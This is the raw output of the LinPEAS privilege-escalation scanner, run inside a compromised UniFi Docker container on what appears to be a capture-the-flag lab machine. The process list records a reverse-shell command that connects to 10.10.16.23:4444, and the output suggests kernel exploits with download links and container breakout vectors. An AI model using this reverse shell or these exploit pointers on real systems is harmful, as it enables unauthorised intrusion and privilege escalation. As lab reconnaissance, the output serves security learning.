# Linpeas as unifi
```
unifi@unified:/tmp/ignore$ cat linpeas.txt
cat linpeas.txt



                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                      
    |---------------------------------------------------------------------------------|                                                                      
    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz         |                                                                      
    |         Follow on Twitter         :     @hacktricks_live                        |                                                                      
    |         Respect on HTB            :     SirBroccoli                             |                                                                      
    |---------------------------------------------------------------------------------|                                                                      
    |                                 Thank you!                                      |                                                                      
    \---------------------------------------------------------------------------------/                                                                      
          LinPEAS-ng by carlospolop                                                                                                                          
                                                                                                                                                             
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                
                                                                                                                                                             
Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
 LEGEND:                                                                                                                                                     
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting LinPEAS. Caching Writable Folders...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                          
                               ╚═══════════════════╝                                                                                                         
OS: Linux version 5.4.0-77-generic (buildd@lgw01-amd64-028) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021
User & Groups: uid=999(unifi) gid=999(unifi) groups=999(unifi)
Hostname: unified

[-] No network discovery capabilities (fping or ping not found)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                                                                                                       
                                                                                                                                                             

Caching directories DONE
                                                                                                                                                             
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                           
                              ╚════════════════════╝                                                                                                         
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                                                            
Linux version 5.4.0-77-generic (buildd@lgw01-amd64-028) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021       
lsb_release Not Found
                                                                                                                                                             
╔══════════╣ Sudo version
sudo Not Found                                                                                                                                               
                                                                                                                                                             

╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses                                                       
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                 

╔══════════╣ Date & uptime
Sat Aug 23 21:59:50 BST 2025                                                                                                                                 
 21:59:50 up  1:13,  0 users,  load average: 0.08, 0.02, 0.01

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                    
                                                                                                                                                             
╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
                                                                                                                                                             
╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                      
BASEDIR=/usr/lib/unifi                                                                                                                                       
BIND_PRIV=true
HOSTNAME=unified
SHLVL=5
OLDPWD=/tmp
HOME=/home/unifi
RUNAS_UID0=true
CERT_IS_CHAIN=false
CERT_PRIVATE_NAME=privkey.pem
ODATADIR=/var/lib/unifi
_=./linpeas.sh
UNIFI_GID=999
RUNDIR=/var/run/unifi
CERTNAME=cert.pem
LOGDIR=/unifi/log
GOSU_VERSION=1.10
UNIFI_UID=999
DATADIR=/unifi/data
PWD=/tmp/ignore
TZ=Europe/London
CERTDIR=/unifi/cert
OLOGDIR=/var/log/unifi

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed                                        
dmesg Not Found                                                                                                                                              
                                                                                                                                                             
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                           
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)                                                                                                         

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-27365] linux-iscsi

   Details: https://blog.grimm-co.com/2021/03/new-old-bugs-in-linux-kernel.html
   Exposure: less probable
   Tags: RHEL=8
   Download URL: https://codeload.github.com/grimm-co/NotQuite0DayFriday/zip/trunk
   Comments: CONFIG_SLAB_FREELIST_HARDENED must not be enabled

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded


╔══════════╣ Protections
═╣ AppArmor enabled? .............. AppArmor Not Found                                                                                                       
═╣ AppArmor profile? .............. unconfined                                                                                                               
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                                                                     
═╣ PaX bins present? .............. PaX Not Found                                                                                                            
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                     
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                       
═╣ Seccomp enabled? ............... enabled                                                                                                                  
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes                                                                                                                      

╔══════════╣ Kernel Modules Information
══╣ Kernel modules with weak perms?                                                                                                                          
/lib/modules Not Found                                                                                                                                       
                                                                                                                                                             
══╣ Kernel modules loadable? 
Modules can be loaded                                                                                                                                        



                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                          
                                   ╚═══════════╝                                                                                                             
╔══════════╣ Container related tools present (if any):
/usr/bin/nsenter                                                                                                                                             
/usr/bin/unshare
/usr/sbin/chroot
/sbin/capsh
/sbin/setcap
/sbin/getcap

╔══════════╣ Container details
═╣ Is this a container? ........... docker                                                                                                                   
═╣ Any running containers? ........ No
                                                                                                                                                             
╔══════════╣ Docker Container details
═╣ Am I inside Docker group ....... No                                                                                                                       
═╣ Looking and enumerating Docker Sockets (if any):
═╣ Docker version ................. Not Found                                                                                                                
═╣ Vulnerable to CVE-2019-5736 .... Not Found                                                                                                                
═╣ Vulnerable to CVE-2019-13139 ... Not Found                                                                                                                
═╣ Vulnerable to CVE-2021-41091 ... Not Found                                                                                                                
═╣ Rootless Docker? ............... No                                                                                                                       


╔══════════╣ Container & breakout enumeration
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html                       
═╣ Container ID ................... unified═╣ Container Full ID .............. 176f726bc7785f4de236915860c23370cf0d35df000f4920d234d43688800b97              
══╣ Security Mechanisms
═╣ Seccomp enabled? ............... enabled                                                                                                                  
═╣ AppArmor profile? .............. unconfined
═╣ User proc namespace? ........... enabled         0          0 4294967295
══╣ Known Vulnerabilities
═╣ Vulnerable to CVE-2019-5021 .... No                                                                                                                       
                                                                                                                                                             
═╣ Container escape tools present .. /usr/bin/nsenter
══╣ Runtime Vulnerabilities
══╣ Breakout via mounts                                                                                                                                      
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/sensitive-mounts.html            
═╣ /proc mounted? ................. No                                                                                                                       
═╣ /dev mounted? .................. No                                                                                                                       
═╣ Run unshare .................... No                                                                                                                       
═╣ release_agent breakout 1........ Yes                                                                                                                      
═╣ release_agent breakout 2........ No
═╣ release_agent breakout 3........                                                                                                                          
═╣ core_pattern breakout .......... No                                                                                                                       
═╣ binfmt_misc breakout ........... No                                                                                                                       
═╣ uevent_helper breakout ......... No                                                                                                                       
═╣ Docker socket mounted? ......... No                                                                                                                       
═╣ Common host filesystem mounted?  /dev/sda2 on /etc/hostname type ext4 (rw,relatime)
/dev/sda2 on /etc/hosts type ext4 (rw,relatime)
═╣ Interesting mounts ............. overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/VI573F62QN6MW3E57N3QCROXC2:/var/lib/docker/overlay2/l/Y44APZVNVMIIXQJ67BJZTLC47P:/var/lib/docker/overlay2/l/CJAW6Z2I4W7UG6F3SWSD3O2JKM:/var/lib/docker/overlay2/l/4FEYGLL2AQIOQEWWLK3SEEPTAY:/var/lib/docker/overlay2/l/DKRCE6DD2ZN3ZTYVUB6MHLQR7J:/var/lib/docker/overlay2/l/BI6DS7G3H4MIZU4KQ6NWJG2JHE:/var/lib/docker/overlay2/l/IXKUBF6JGWI6FI4AA2LRMIBJIP:/var/lib/docker/overlay2/l/LIKAVPY5XHBFDBJCDTJ4UJ6UZD:/var/lib/docker/overlay2/l/BXEZ457ZXVRKBRTRRRQ5642DNW:/var/lib/docker/overlay2/l/SLVJK6AMRSNRZY36WBLJL5HYIS:/var/lib/docker/overlay2/l/JHIDNV3DVDFKBRP772BSNKEHM5:/var/lib/docker/overlay2/l/HCK7VDXR5W7ZX6AXHAXB6O34KZ:/var/lib/docker/overlay2/l/DOBKMJD7ZRANJ4A5SEURP7IHHQ,upperdir=/var/lib/docker/overlay2/1ab10644f88f62b20b969b367f1d66f756a1c7e819a07f02d9f52b872ac13a6b/diff,workdir=/var/lib/docker/overlay2/1ab10644f88f62b20b969b367f1d66f756a1c7e819a07f02d9f52b872ac13a6b/work,xino=off)
/dev/sda2 on /sbin/docker-init type ext4 (ro,relatime)
═╣ Writable mount points ......... overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/VI573F62QN6MW3E57N3QCROXC2:/var/lib/docker/overlay2/l/Y44APZVNVMIIXQJ67BJZTLC47P:/var/lib/docker/overlay2/l/CJAW6Z2I4W7UG6F3SWSD3O2JKM:/var/lib/docker/overlay2/l/4FEYGLL2AQIOQEWWLK3SEEPTAY:/var/lib/docker/overlay2/l/DKRCE6DD2ZN3ZTYVUB6MHLQR7J:/var/lib/docker/overlay2/l/BI6DS7G3H4MIZU4KQ6NWJG2JHE:/var/lib/docker/overlay2/l/IXKUBF6JGWI6FI4AA2LRMIBJIP:/var/lib/docker/overlay2/l/LIKAVPY5XHBFDBJCDTJ4UJ6UZD:/var/lib/docker/overlay2/l/BXEZ457ZXVRKBRTRRRQ5642DNW:/var/lib/docker/overlay2/l/SLVJK6AMRSNRZY36WBLJL5HYIS:/var/lib/docker/overlay2/l/JHIDNV3DVDFKBRP772BSNKEHM5:/var/lib/docker/overlay2/l/HCK7VDXR5W7ZX6AXHAXB6O34KZ:/var/lib/docker/overlay2/l/DOBKMJD7ZRANJ4A5SEURP7IHHQ,upperdir=/var/lib/docker/overlay2/1ab10644f88f62b20b969b367f1d66f756a1c7e819a07f02d9f52b872ac13a6b/diff,workdir=/var/lib/docker/overlay2/1ab10644f88f62b20b969b367f1d66f756a1c7e819a07f02d9f52b872ac13a6b/work,xino=off)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,relatime,mode=755)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
/dev/sda2 on /unifi type ext4 (rw,relatime)
/dev/sda2 on /home/michael type ext4 (rw,relatime)
/dev/sda2 on /etc/resolv.conf type ext4 (rw,relatime)
/dev/sda2 on /etc/hostname type ext4 (rw,relatime)
/dev/sda2 on /etc/hosts type ext4 (rw,relatime)
/dev/sda2 on /run/unifi type ext4 (rw,relatime)
tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/sched_debug type tmpfs (rw,nosuid,size=65536k,mode=755)
═╣ Shared mount points ........... ══╣ Capability Checks
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/capabilities-abuse-escape.html   
═╣ Dangerous capabilities ......... Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+i
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=999(unifi)
gid=999(unifi)
groups=
═╣ Dangerous syscalls allowed ... 1
══╣ Namespace Checks
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/namespaces/index.html                                                 
═╣ Current namespaces ............. total 0                                                                                                                  
lrwxrwxrwx 1 unifi unifi 0 Aug 23 21:59 cgroup -> cgroup:[4026531835]
lrwxrwxrwx 1 unifi unifi 0 Aug 23 21:59 ipc -> ipc:[4026532552]
lrwxrwxrwx 1 unifi unifi 0 Aug 23 21:59 mnt -> mnt:[4026532550]
lrwxrwxrwx 1 unifi unifi 0 Aug 23 21:59 net -> net:[4026531992]
lrwxrwxrwx 1 unifi unifi 0 Aug 23 21:59 pid -> pid:[4026532553]
lrwxrwxrwx 1 unifi unifi 0 Aug 23 21:59 pid_for_children -> pid:[4026532553]
lrwxrwxrwx 1 unifi unifi 0 Aug 23 21:59 user -> user:[4026531837]
lrwxrwxrwx 1 unifi unifi 0 Aug 23 21:59 uts -> uts:[4026532551]
═╣ Host network namespace? ........ No
═╣ Host IPC namespace? ........... No
═╣ Host PID namespace? ........... No
═╣ Host UTS namespace? ........... No
══╣ Additional Breakout Vectors
═╣ is modprobe present ............ No                                                                                                                       
═╣ DoS via panic_on_oom ........... No                                                                                                                       
═╣ DoS via panic_sys_fs ........... No                                                                                                                       
═╣ DoS via sysreq_trigger_dos ..... No                                                                                                                       
═╣ Container escape tools in PATH . /usr/bin/nsenter                                                                                                         
══╣ Extra Breakout Vectors
═╣ /proc/config.gz readable ....... No                                                                                                                       
═╣ /proc/sched_debug readable ..... Yes                                                                                                                      
═╣ /proc/*/mountinfo readable ..... Yes
═╣ /sys/kernel/security present ... Yes
═╣ /sys/kernel/security writable .. No
═╣ /proc/kmsg readable ............ No                                                                                                                       
═╣ /proc/kallsyms readable ........ Yes                                                                                                                      
═╣ /proc/self/mem readable ........ No
═╣ /proc/kcore readable ........... No                                                                                                                       
═╣ /proc/kmem readable ............ No                                                                                                                       
═╣ /proc/kmem writable ............ No                                                                                                                       
═╣ /proc/mem readable ............. No                                                                                                                       
═╣ /proc/mem writable ............. No                                                                                                                       
═╣ /sys/kernel/vmcoreinfo readable  Yes                                                                                                                      
═╣ /sys/firmware/efi/vars writable  No
═╣ /sys/firmware/efi/efivars writable No                                                                                                                     
═╣ Kernel version .............. Linux unified 5.4.0-77-generic #86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux                   
═╣ Kernel modules ............. ═╣ Container runtime sockets .. No
═╣ Container runtime configs .. No
══╣ Interesting Files & Mounts
═╣ Interesting files mounted ........ overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/VI573F62QN6MW3E57N3QCROXC2:/var/lib/docker/overlay2/l/Y44APZVNVMIIXQJ67BJZTLC47P:/var/lib/docker/overlay2/l/CJAW6Z2I4W7UG6F3SWSD3O2JKM:/var/lib/docker/overlay2/l/4FEYGLL2AQIOQEWWLK3SEEPTAY:/var/lib/docker/overlay2/l/DKRCE6DD2ZN3ZTYVUB6MHLQR7J:/var/lib/docker/overlay2/l/BI6DS7G3H4MIZU4KQ6NWJG2JHE:/var/lib/docker/overlay2/l/IXKUBF6JGWI6FI4AA2LRMIBJIP:/var/lib/docker/overlay2/l/LIKAVPY5XHBFDBJCDTJ4UJ6UZD:/var/lib/docker/overlay2/l/BXEZ457ZXVRKBRTRRRQ5642DNW:/var/lib/docker/overlay2/l/SLVJK6AMRSNRZY36WBLJL5HYIS:/var/lib/docker/overlay2/l/JHIDNV3DVDFKBRP772BSNKEHM5:/var/lib/docker/overlay2/l/HCK7VDXR5W7ZX6AXHAXB6O34KZ:/var/lib/docker/overlay2/l/DOBKMJD7ZRANJ4A5SEURP7IHHQ,upperdir=/var/lib/docker/overlay2/1ab10644f88f62b20b969b367f1d66f756a1c7e819a07f02d9f52b872ac13a6b/diff,workdir=/var/lib/docker/overlay2/1ab10644f88f62b20b969b367f1d66f756a1c7e819a07f02d9f52b872ac13a6b/work,xino=off)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,relatime,mode=755)
cgroup on /sys/fs/cgroup/systemd type cgroup (ro,nosuid,nodev,noexec,relatime,xattr,name=systemd)
cgroup on /sys/fs/cgroup/memory type cgroup (ro,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (ro,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/pids type cgroup (ro,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/perf_event type cgroup (ro,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/cpuset type cgroup (ro,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/devices type cgroup (ro,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (ro,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/rdma type cgroup (ro,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/blkio type cgroup (ro,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (ro,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/freezer type cgroup (ro,nosuid,nodev,noexec,relatime,freezer)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
/dev/sda2 on /sbin/docker-init type ext4 (ro,relatime)
/dev/sda2 on /unifi type ext4 (rw,relatime)
/dev/sda2 on /home/michael type ext4 (rw,relatime)
/dev/sda2 on /etc/resolv.conf type ext4 (rw,relatime)
/dev/sda2 on /etc/hostname type ext4 (rw,relatime)
/dev/sda2 on /etc/hosts type ext4 (rw,relatime)
/dev/sda2 on /run/unifi type ext4 (rw,relatime)
proc on /proc/bus type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/fs type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/irq type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sys type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sysrq-trigger type proc (ro,nosuid,nodev,noexec,relatime)
tmpfs on /proc/acpi type tmpfs (ro,relatime)
tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/sched_debug type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/scsi type tmpfs (ro,relatime)
tmpfs on /sys/firmware type tmpfs (ro,relatime)
═╣ Possible entrypoints ........... 


                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                          
                                     ╚═══════╝                                                                                                               
Learn and practice cloud hacking techniques in https://training.hacktricks.xyz
                                                                                                                                                             
═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM or Az metadata? ............. No
═╣ Azure APP or IDENTITY_ENDPOINT? ...... No
═╣ Azure Automation Account? ............ No
═╣ Aliyun ECS? .......................... No
═╣ Tencent CVM? ......................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                           
                ╚════════════════════════════════════════════════╝                                                                                           
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes                  
unifi          1  0.0  0.0   1080     4 ?        Ss   20:46   0:00 /sbin/docker-init -- /usr/local/bin/docker-entrypoint.sh unifi                            
unifi          7  0.0  0.1  18512  3172 ?        S    20:46   0:00 bash /usr/local/bin/docker-entrypoint.sh unifi
unifi         17  0.6 25.8 3672996 525856 ?      Sl   20:46   0:30  _ java -Dunifi.datadir=/unifi/data -Dunifi.logdir=/unifi/log -Dunifi.rundir=/var/run/unifi -Xmx1024M -Djava.awt.headless=true -Dfile.encoding=UTF-8 -jar /usr/lib/unifi/lib/ace.jar start                                                             
unifi         67  0.1  4.1 1103748 85244 ?       Sl   20:46   0:08      _ bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1           
unifi       1128  0.0  0.1  18380  3140 ?        S    21:23   0:00      _ bash -c 0<&155-;exec 155<>/dev/tcp/10.10.16.23/4444;sh <&155 >&155 2>&155
unifi       1130  0.0  0.0   4632  1728 ?        S    21:23   0:00          _ sh
unifi       1563  0.0  0.1  19312  2224 ?        S    21:39   0:00              _ /usr/bin/script /dev/null
unifi       1564  0.0  0.0   4632   780 pts/0    Ss   21:39   0:00                  _ sh -i
unifi       1752  0.0  0.1  18512  3444 pts/0    S    21:46   0:00                      _ /bin/bash -i
unifi       1807  0.0  0.1  18512  3512 pts/0    S    21:48   0:00                          _ bash -i
unifi       2113  0.4  0.1   5540  2532 pts/0    S+   21:59   0:00                              _ /bin/sh ./linpeas.sh
unifi       5048  0.0  0.0   5540  1000 pts/0    S+   21:59   0:00                                  _ /bin/sh ./linpeas.sh
unifi       5052  0.0  0.1  34408  2924 pts/0    R+   21:59   0:00                                  |   _ ps fauxwww
unifi       5050  0.0  0.0   5540  1000 pts/0    R+   21:59   0:00                                  _ /bin/sh ./linpeas.sh
unifi       5051  0.0  0.0   5540  1000 pts/0    S+   21:59   0:00                                  _ /bin/sh ./linpeas.sh

╔══════════╣ Processes with unusual configurations
Process 17 (unifi) - java -Dunifi.datadir=/unifi/data -Dunifi.logdir=/unifi/log -Dunifi.rundir=/var/run/unifi -Xmx1024M -                                    
Unusual number of FDs: 239

Process 67 (unifi) - bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logR
Unusual number of FDs: 153


╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory                                            
gdm-password Not Found                                                                                                                                       
gnome-keyring-daemon Not Found                                                                                                                               
lightdm Not Found                                                                                                                                            
vsftpd Not Found                                                                                                                                             
apache2 Not Found                                                                                                                                            
sshd: Not Found                                                                                                                                              
mysql Not Found                                                                                                                                              
postgres Not Found                                                                                                                                           
redis-server Not Found                                                                                                                                       
mongod process found (dump creds from memory as root)                                                                                                        
memcached Not Found
elasticsearch Not Found                                                                                                                                      
jenkins Not Found                                                                                                                                            
tomcat Not Found                                                                                                                                             
nginx Not Found                                                                                                                                              
php-fpm Not Found                                                                                                                                            
supervisord Not Found                                                                                                                                        
vncserver Not Found                                                                                                                                          
xrdp Not Found                                                                                                                                               
teamviewer Not Found                                                                                                                                         
                                                                                                                                                             
╔══════════╣ Opened Files by processes
Process 1 (unifi) - /sbin/docker-init -- /usr/local/bin/docker-entrypoint.sh unifi                                                                           
  └─ Has open files:
    └─ pipe:[25614]
    └─ pipe:[25615]
Process 7 (unifi) - bash /usr/local/bin/docker-entrypoint.sh unifi 
  └─ Has open files:
    └─ pipe:[25614]
    └─ pipe:[25615]
    └─ /usr/local/bin/docker-entrypoint.sh
Process 17 (unifi) - java -Dunifi.datadir=/unifi/data -Dunifi.logdir=/unifi/log -Dunifi.rundir=/var/run/unifi -Xmx1024M -
  └─ Has open files:
    └─ pipe:[25614]
    └─ /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext/sunec.jar
    └─ /usr/lib/unifi/lib/jstun-0.7.4.jar
    └─ /usr/lib/unifi/lib/jul-to-slf4j-1.7.30.jar
    └─ /usr/lib/unifi/lib/log4j-api-2.13.3.jar
    └─ /usr/lib/unifi/lib/log4j-core-2.13.3.jar
    └─ /usr/lib/unifi/lib/log4j-slf4j-impl-2.13.3.jar
    └─ /usr/lib/unifi/lib/mongo-java-driver-3.4.3.jar
    └─ /usr/lib/unifi/lib/openssh-1.0.jar
    └─ /usr/lib/unifi/lib/org.eclipse.paho.client.mqttv3-1.1.0.jar
